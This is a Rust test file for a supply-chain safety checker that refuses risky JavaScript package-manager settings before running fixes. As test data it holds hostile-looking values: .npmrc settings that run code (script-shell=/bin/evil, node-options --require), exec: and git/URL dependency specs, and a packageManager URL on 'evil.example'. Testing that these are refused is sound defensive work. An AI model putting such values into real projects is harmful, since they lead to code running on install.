use super::*;

fn dir_with(files: &[(&str, &str)]) -> PathBuf {
    use std::sync::atomic::{AtomicU64, Ordering};
    static COUNTER: AtomicU64 = AtomicU64::new(0);
    let dir = std::env::temp_dir().join(format!(
        "sj-js-fix-{}-{}",
        std::process::id(),
        COUNTER.fetch_add(1, Ordering::SeqCst)
    ));
    let _ = std::fs::remove_dir_all(&dir);
    for (name, content) in files {
        let path = dir.join(name);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, content).unwrap();
    }
    dir
}

#[test]
fn npmrc_settings_that_run_code_are_refused() {
    for setting in [
        "script-shell=/bin/evil",
        "node-options=--require ./x.js",
        "ignore-scripts=false",
        "use-node-version=21.0.0",
    ] {
        let dir = dir_with(&[(".npmrc", setting)]);
        assert!(refuse_npmrc(&dir.join(".npmrc")).is_err(), "{setting}");
    }
    let dir = dir_with(&[(
        ".npmrc",
        "# comment\nregistry=https://registry.npmjs.org/\n",
    )]);
    assert!(refuse_npmrc(&dir.join(".npmrc")).is_ok());
}

#[test]
fn yarn_and_pnpm_settings_that_load_code_are_refused() {
    let dir = dir_with(&[(".yarnrc.yml", "yarnPath: .yarn/releases/yarn.cjs\n")]);
    assert!(refuse_yaml_keys(&dir.join(".yarnrc.yml"), &["yarnPath", "plugins"]).is_err());
    let dir = dir_with(&[(
        "pnpm-workspace.yaml",
        "packages:\n  - 'a/*'\nconfigDependencies:\n  x: 1.0.0\n",
    )]);
    assert!(refuse_yaml_keys(&dir.join("pnpm-workspace.yaml"), PNPM_WORKSPACE_DENIED).is_err());
    let dir = dir_with(&[("pnpm-workspace.yaml", "packages:\n  - 'a/*'\n")]);
    assert!(refuse_yaml_keys(&dir.join("pnpm-workspace.yaml"), PNPM_WORKSPACE_DENIED).is_ok());
}

#[test]
fn git_url_path_and_exec_dependencies_are_refused() {
    for spec in [
        "git+https://github.com/a/b.git",
        "github:a/b",
        "a/b#main",
        "https://example.com/x.tgz",
        "file:../local",
        "link:../local",
        "exec:./build.js",
        "patch:left-pad@1.3.0#./p.patch",
        "npm:git+ssh://git@github.com/a/b.git",
    ] {
        let manifest = format!(r#"{{"name":"app","dependencies":{{"x":"{spec}"}}}}"#);
        let dir = dir_with(&[("package.json", &manifest)]);
        assert!(
            refuse_code_specs(&[dir.join("package.json")]).is_err(),
            "{spec}"
        );
    }
    let manifest =
        r#"{"name":"app","dependencies":{"a":"^1.0.0","b":"npm:real@1.0.0","@s/c":"workspace:*"}}"#;
    let dir = dir_with(&[("package.json", manifest)]);
    assert!(refuse_code_specs(&[dir.join("package.json")]).is_ok());
}

#[test]
fn a_package_manager_download_url_is_refused() {
    let dir = dir_with(&[(
        "package.json",
        r#"{"name":"app","packageManager":"yarn@https://evil.example/yarn.tgz"}"#,
    )]);
    let ctx_config = config::SloppyJoeConfig::default();
    let ctx = FixCtx {
        scan_root: &dir,
        config: &ctx_config,
        specs: &[],
    };
    assert!(preconditions(&ctx, &dir, JsPackageManager::Yarn).is_err());
    let dir = dir_with(&[(
        "package.json",
        r#"{"name":"app","packageManager":"yarn@4.9.2"}"#,
    )]);
    assert!(preconditions(&ctx, &dir, JsPackageManager::Yarn).is_ok());
}

#[test]
fn every_manager_recipe_disables_scripts_in_the_environment() {
    let env = manager_env();
    for (name, value) in [
        ("npm_config_ignore_scripts", "true"),
        ("YARN_ENABLE_SCRIPTS", "0"),
        ("npm_config_manage_package_manager_versions", "false"),
    ] {
        assert!(
            env.iter()
                .any(|(key, v)| *key == name && *v == EnvValue::Literal(value.to_string())),
            "{name}"
        );
    }
}
